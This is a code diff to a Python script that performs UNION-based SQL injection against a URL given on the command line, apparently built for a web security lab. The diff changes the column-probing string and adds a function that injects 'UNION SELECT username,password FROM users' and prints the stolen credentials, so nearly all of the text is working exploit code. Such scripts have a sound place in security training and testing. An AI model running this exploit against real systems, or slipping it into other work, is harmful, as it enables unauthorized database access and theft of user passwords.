@@ -33,10 +33,10 @@ def string_check(url,num_columns,the_nulls):
     # Loops through the_nulls swapping in 'a' in each position based on the value of i
     for i in range(0,num_columns):
         the_nulls.pop(0) # Take a null off the front
-        the_nulls.insert(i, "'a'") # Put an a in the correct spot
+        the_nulls.insert(i, "'ibDJAv'") # Put an a in the correct spot
         space_string = ","
         null_string = space_string.join(the_nulls)
-        payload = "'+UNION+SELECT+" + null_string + '--' #Add/remove +FROM+dual as needed
+        payload = "'+UNION+SELECT+" + null_string + '--'
         #print(payload)
         r = requests.get(url + payload, verify=False, proxies=proxies)
         if r.status_code == 200:
@@ -46,6 +46,11 @@ def string_check(url,num_columns,the_nulls):
         the_nulls.pop(i) # Remove 'a'
         the_nulls.append('null') # Put a null back
 
+def exploit_data_exfil(url):
+    payload = "+UNION+SELECT+username,password+FROM+users--"
+    r = requests.get(url + payload, verify=False, proxies=proxies)
+    data = r.text
+    return (data)
 if __name__ == "__main__":
     try:
         url = sys.argv[1].strip()  
@@ -58,5 +63,8 @@ if __name__ == "__main__":
     num_columns = exploit_orderby(url)
     print('Creating list')
     the_nulls = create_nulls(num_columns)
-    print('Running UNION exploit')
+    print('Finding columns that accept strings')
     string_check(url, num_columns, the_nulls)
+    print('Running data exfiltration')
+    data_exil = exploit_data_exfil(url)
+    print(data_exil)
